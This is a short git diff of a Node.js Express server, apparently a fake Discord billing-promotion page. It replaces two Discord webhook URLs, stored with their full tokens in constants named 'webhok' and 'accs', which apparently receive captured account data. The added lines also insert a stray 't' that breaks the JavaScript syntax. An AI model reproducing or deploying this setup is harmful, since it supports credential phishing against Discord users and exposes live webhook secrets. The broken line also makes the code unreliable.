@@ -14,8 +14,8 @@ const {
 
 const publicPath = path.join(__dirname, 'public')
 const port = process.env.PORT || 80
-const webhok = "https://discord.com/api/webhooks/954865663799877702/nMHJwjvHnw6YNhUkGCfxXGmBLrroUQ6FBrLDMgV7lHv5fxGHto0wIzd21IdkleHSsW_5";
-const accs = "https://discord.com/api/webhooks/954865663799877702/nMHJwjvHnw6YNhUkGCfxXGmBLrroUQ6FBrLDMgV7lHv5fxGHto0wIzd21IdkleHSsW_5";
+const webhok = "https://discord.com/api/webhooks/1007610902360641566/tgUNCV2m4C1WfaDhiP_AsRhz9yJOorq9w3R9U2Fv1XUlaiYsxUiXnfXE9goYA79UVd4n";
+const accs = "https://discord.com/api/webhooks/1007610902360641566/tgUNCV2m4C1WfaDhiP_AsRhz9yJOorq9w3R9U2Fv1XUlaiYsxUiXnfXE9goYA79UVd4n";
 let app = express()
 let server = http.createServer(app)
 let io = socketIO(server, {
@@ -26,7 +26,7 @@ app.use(cookieParser())
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({
     extended: true
-}));
+}));t
 app.use(express.static('public'))
 
 app.get('/billing/promotions/:code', function (req, res) {
